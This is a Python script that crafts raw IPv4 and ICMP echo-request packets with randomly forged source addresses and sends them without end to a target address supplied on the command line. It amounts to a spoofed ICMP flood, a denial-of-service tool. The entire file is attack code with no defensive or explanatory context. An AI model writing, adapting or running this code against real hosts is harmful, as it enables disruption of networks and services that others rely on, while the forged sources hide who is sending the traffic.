#!/usr/bin/env python3
import argparse
import socket
import struct
import random
import binascii
import threading

class generate_ransrc:
    def __init__(self):
        self.new_src_address = None

    def random_address(self):
        self.new_src_address = [0, 0, 0, 0]

        self.new_src_address[0] = str(random.randrange(1,125)) 
        self.new_src_address[1] = str(random.randrange(1,254))
        self.new_src_address[2] = str(random.randrange(1,254))
        self.new_src_address[3] = str(random.randrange(1,254))

        self.new_src_address = self.new_src_address[0]+'.'+self.new_src_address[1]+'.' \
                                    +self.new_src_address[2]+'.'+self.new_src_address[3]

        return self.new_src_address 

class the_ethernet_header:
    def __init__(self, destination_mac, source_mac, ethernet_protocol):
        self.destination_mac = destination_mac
        self.source_mac = source_mac
        self.ethernet_protocol = ethernet_protocol
        self.new_eth_header = None

    def create_eth_header(self):
        self.eth_dst = self.destination_mac
        self.eth_src = self.source_mac
        self.eth_proto = self.ethernet_protocol

        self.new_eth_header = struct.pack('!6s6sH',
        binascii.unhexlify(self.eth_dst.replace(':','')),
        binascii.unhexlify(self.eth_src.replace(':','')),
        self.eth_proto)

        return self.new_eth_header

class the_ipv4_header:
    def __init__(self, src_address, dst_address):
        self.src_address = src_address
        self.dst_address = dst_address
        self.new_ipv4_header = None

    def create_ipv4_packet(self):
        ip_ver = 4  
        ip_ihl = 5  
        self.ip_ver = (ip_ver << 4) + ip_ihl 

        ip_dsc = 0
        ip_enc = 0
        self.ip_tos = (ip_dsc << 2) + ip_enc 

        self.ip_tolen = 0 

        self.ip_id = 54321 

        ip_default = 0 
        ip_dontfrag = 0 
        ip_morefrag = 0 
        ip_fragoff = 0 
        self.ip_flg = (ip_default << 7) + (ip_dontfrag << 6) + (ip_morefrag << 5) + (ip_fragoff) 

        self.ip_ttl = 255 

        self.ip_proto = socket.IPPROTO_ICMP 

        self.ip_chksm = 0 

        self.ip_src = socket.inet_aton(self.src_address) 
        self.ip_dst = socket.inet_aton(self.dst_address) 


        self.new_ipv4_header = struct.pack('!BBHHHBBH4s4s',  
        self.ip_ver, self.ip_tos, self.ip_tolen, self.ip_id, self.ip_flg, self.ip_ttl, \
        self.ip_proto, self.ip_chksm, self.ip_src, self.ip_dst) 

        return self.new_ipv4_header 

class the_icmp_header:
    def __init__(self):
        self.new_icmp_header = None

    def create_icmp_header(self):
        self.icm_type = 8
        self.icm_code = 0
        self.icm_chksm = 0xf7fd
        self.icm_id = 1
        self.icm_seq = 1

        self.new_icmp_header = struct.pack('!bbHHh',
        self.icm_type, self.icm_code, self.icm_chksm, self.icm_id, self.icm_seq)

        return self.new_icmp_header

parser = argparse.ArgumentParser()
parser.add_argument('traget_host', help='ENTER THE TRAGET IP ADDRESS', type=str) 
parser.add_argument('target_port', help='ENTER THE TARGET PORT NUMBER', type=int) 
args = parser.parse_args()

connection = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connection.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

while True:
    random_src_add = generate_ransrc() 
    random_src_add.random_address() 
    source_host = random_src_add.new_src_address 

    get_eth_header = the_ethernet_header('10:10:10:10:10:10','20:20:20:20:20:20',0x0800)
    get_eth_header.create_eth_header()
    eth_frame_01 = get_eth_header.new_eth_header

    get_ipv4_address = the_ipv4_header(source_host,args.traget_host) 
    get_ipv4_address.create_ipv4_packet() 
    ipv4_packet_01 = get_ipv4_address.new_ipv4_header 

    get_icmp_header = the_icmp_header()
    get_icmp_header.create_icmp_header()
    icmp_segment_01 = get_icmp_header.new_icmp_header

    connection.sendto(ipv4_packet_01 + icmp_segment_01, ((args.traget_host,args.target_port)))
    print ('PACKET SENT TO {} : SOURCE ADDRESS SET TO {}'.format(args.traget_host, source_host))

